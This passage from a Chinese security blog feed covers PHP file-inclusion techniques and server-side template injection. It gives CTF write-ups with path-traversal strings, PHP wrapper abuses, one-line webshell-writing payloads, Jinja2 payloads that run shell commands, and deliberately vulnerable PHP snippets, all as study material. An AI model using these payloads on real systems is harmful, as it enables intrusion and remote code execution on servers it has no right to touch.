function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315203414355.png" alt="" loading="lazy"></p><p>可用于读取系统其它文件的内容</p><p>例如<code>2.php?a=../../../../../../../etc/passwd</code></p><p>有限制：</p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token number">1</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>绕过方法：</p><p><code>%00</code>截断，条件：<code>magic_quotes_gpc</code> = <code>Off</code>，php版本&lt;<code>5.3.4</code></p><p>路径长度截断，条件：php版本&lt;<code>5.2.8</code></p><p>windows OS –&gt; 在文件后加点，点号需要长于256；linux OS –&gt; 用<code>./</code>，需长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>无限制：</p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token number">1</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210218269.png" alt="" loading="lazy"></p><p>有限制：</p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token number">1</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在末尾加上<code>%3f</code>，<code>%23</code>绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210124764.png" alt="" loading="lazy"></p><h3 id="PHP支持的协议和封装协议"><a href="#PHP支持的协议和封装协议" class="headerlink" title="PHP支持的协议和封装协议"></a>PHP支持的协议和封装协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>当<code>enctype=”multipart/form-data”</code>时<code>php://input</code>无效</p><p>用法<code>?file=php://input</code>，利用POST传入</p><p>利用<code>php://input</code>写马（亦可命令执行）：</p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>要求：同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）即可造成任意代码执行</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212029230.png" alt="" loading="lazy"></p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>参考：<a href="https://www.leavesongs.com/search/?keyword=filter" target="_blank" rel="noopener">https://www.leavesongs.com/search/?keyword=filter</a></p><p>一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">筛选过滤</a>应用。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507163438086.png" alt="" loading="lazy"></p><p>读取文件：<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p><p>绕过exit</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>成功写马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507174823081.png" alt="" loading="lazy"></p><p><code>string.strip_tags</code>方法</p><p><strong><a href="https://www.php.net/manual/zh/filters.string.strip_tags.php" target="_blank" rel="noopener">string.strip_tags</a></strong>：使用此过滤器等同于用 <code>strip_tags()</code>函数处理所有的流数据。可以用两种格式接收参数：一种是和 <code>strip_tags()</code>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p><p><strong><a href="https://www.php.net/manual/zh/function.strip-tags.php" target="_blank" rel="noopener">strip_tags()</a></strong>：从字符串中去除 HTML 和 PHP 标记</p><p><strong>ROT13</strong>方法</p><p>编码解码网站：<a href="https://cryptii.com/pipes/rot13-decoder" target="_blank" rel="noopener">https://cryptii.com/pipes/rot13-decoder</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180852771.png" alt="" loading="lazy"></p><h4 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file://伪协议"></a>file://伪协议</h4><p>访问本地文件系统</p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token number">1</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212627490.png" alt="" loading="lazy"></p><p>注：这里的文件路径需要本地文件的绝对路径</p><h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><p>用法：<code>data://text/plain;base64,</code></p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">===</span>base64<span class="token operator">===</span><span class="token operator">></span>  PD9waHAgcGhwaW5mbygpOw<span class="token operator">==</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315213202734.png" alt="" loading="lazy"></p><p>读取文件内容操作</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">===</span>base64<span class="token operator">===</span><span class="token operator">></span>   PD9waHAgc2hvd19zb3VyY2UoJzEucGhwJyk7</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315214340393.png" alt="" loading="lazy"></p><h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>用法：<code>?a=phar://压缩包/内部文件 phar://xxx.png/shell.php</code></p><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p><p>步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215247124.png" alt="" loading="lazy"></p><p>亦可写马</p><pre><code>cmd=fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215651827.png" alt="" loading="lazy"></p><h4 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h4><pre class=" language-php"><code class="language-php"><span class="token number">2</span><span class="token punctuation">.</span>php代码：<span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</code></p><p>条件： PHP &gt; =5.3.0， #在浏览器中要编码为%23</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315220043657.png" alt="" loading="lazy"></p><p>亦可与上面的一样就行写马操作</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="ZJCTF-2019—NiZhuanSiWei"><a href="#ZJCTF-2019—NiZhuanSiWei" class="headerlink" title="ZJCTF-2019—NiZhuanSiWei"></a>ZJCTF-2019—NiZhuanSiWei</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>file_get_contents</code>：将整个文件读入一个字符串</p><p>首先传入<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code>绕过第一个if</p><p>然后传入<code>file=php://filter/read=convert.base64-encode/resource=useless.php</code>读取<code>useless.php</code></p><p>base64解码后代码如下：</p><pre class=" language-PHP"><code class="language-PHP"><?php  class Flag{  //flag.php      public $file;      public function __tostring(){          if(isset($this->file)){              echo file_get_contents($this->file);             echo "<br>";        return ("U R SO CLOSE !///COME ON PLZ");        }      }  }  ?>  </code></pre><p>随后再传入<code>password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>，包含<code>file=useless.php</code>即可得到flag</p><p>完整payload：</p><pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=file=useless.phppassword=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考：&lt;a href=&quot;https://www.freebuf.com/articles/web/182280.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/web/182280.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文件包含作用函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;require//包含过程中出现错误直接退出程序
include();//包含过程出现错误，抛出警告，程序继续运行
require_once();//包括require()的功能，但函数只包含一次
include_once();//包括include()的功能，但函数只包含一次&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该函数用以加载另一个文件中的php代码，并且当php来执行&lt;/p&gt;
&lt;p&gt;而漏洞产生的原因则是因为当函数中的参数未经过严格的过滤，且用户可控时，当用户包含了其它恶意文件代码，就导致执行了非预期操作&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="文件包含" scheme="https://www.extrader.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>SSTI</title>
    <link href="https://www.extrader.top/2020/03/18/SSTI/"/>
    <id>https://www.extrader.top/2020/03/18/SSTI/</id>
    <published>2020-03-17T16:00:00.000Z</published>
    <updated>2020-07-14T10:44:51.298Z</updated>
    
    <content type="html"><![CDATA[<p>先搬一张大佬的图：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200521204901527.png" alt="" loading="lazy"></p><a id="more"></a><h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>打开链接发现就一个这东西</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-81.png" alt="" loading="lazy"></p><p>懵了，于是购买writeup进行学习：</p><p>发现该题是一个利用“Python SSTI”,“404模板注入”的原理</p><p>题目类型深度剖析移步大佬的文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p><p>方法：</p><pre class=" language-shell"><code class="language-shell">__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用</code></pre><p>解题步骤：</p><p>1、测试是否存在SSTI：</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/{ {1+2}} </code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-82.png" alt="" loading="lazy"></p><p>事实证明存在SSTI</p><p>2、访问</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/{ {[].__class__.__base__.__subclasses__()}}</code></pre><p>来查看所有模块</p><p>3、os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个（我眼瞎了，不要问我为什么）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-83.png" style="zoom:80%;" / loading="lazy"><p>4、访问</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/{ {[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}</code></pre><p>查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-84.png" alt="" loading="lazy"></p><p>5.使用[‘o’+’s’],可绕过对os字符的过滤，访问</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/{ {().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )}}</code></pre><p>查看flag文件所在</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-85.png" alt="" loading="lazy"></p><p>6、访问</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//111.198.29.45:46675/{ {"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()}}</code></pre><p>可得到flag，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-86.png" alt="" loading="lazy"></p><p><strong>writeup里的另外一种姿势：</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-87.png" alt="" loading="lazy"></p><p><strong>另外，里面还有一种更骚的操作：</strong></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-88.png" alt="" loading="lazy"></p><p>这里用到了一个工具：<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">tplmap</a></p><p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p><p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html" target="_blank" rel="noopener">Python OS 文件/目录方法</a></p><h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="BJDCTF-2nd-fake google"></a>BJDCTF-2nd-fake google</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100426394.png" alt="" loading="lazy"></p><p>随便输入测试后得到一以下结果，推测是SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100451322.png" alt="" loading="lazy"></p><p>F12打开后发现提示果然是SSTI</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200324100534466.png" alt="" loading="lazy"></p><p>测试后发现啥都没过滤，于是直接上payload：</p><p>payload1：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span>```payload2：```python<span class="token punctuation">{</span><span class="token punctuation">{</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag | base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>```命令执行：```python<span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span></code></pre><p>文件操作：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span></code></pre><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="护网杯 2018-easy_tornado"></a>护网杯 2018-easy_tornado</h3><p>题目界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200412112736253.png" alt="" loading="lazy"></p><p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=766846dacf2bd89cde918d880dd30d77</code></p><p>根据提示<code>flag</code>在<code>/fllllllllllllag</code>中，<code>hints</code>为<code>md5(cookie_secret+md5(filename))</code></p><p>观察url后推测出其中的关系<code>filehash=md5(cookie_secret+md5(filename))</code></p><p>也就是说<code>filename</code>有了，只需要拿到<code>cookie_secret</code>再经过<code>md5</code>换算后传入即可得到<code>flag</code></p><p>一种方法，根据已有的<code>filename</code>和<code>filehash</code>爆破出<code>cookie_secret</code>值，当然这种方法爆破不知道爆破到什么时候去了，随手测试后发现当<code>filename</code>和<code>filehash</code>不对应的时候有一个error页面</p><p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/error?msg=Error</code></p><p>测试<code>error?msg=1</code>发现有回显，应该存在模板注入</p><p>百度<code>reader</code>发现是<code>Tornado</code>框架中的一个渲染模板</p><p>参考：<a href="https://xz.aliyun.com/t/2908" target="_blank" rel="noopener">https://xz.aliyun.com/t/2908</a></p><p>通过<code>handler.application</code>可访问整个Tornado</p><p>通过<code>{ {handler.application.settings}}</code>或者<code>{ {handler.settings}}</code>就可获得<code>settings</code>中的<strong>cookie_secret</strong></p><p><code>/fllllllllllllag</code>md5加密后在前面加上<code>cookie_secret</code>再经过md5加密后的值再和<code>/fllllllllllllag</code>传入url中即可得到flag</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" 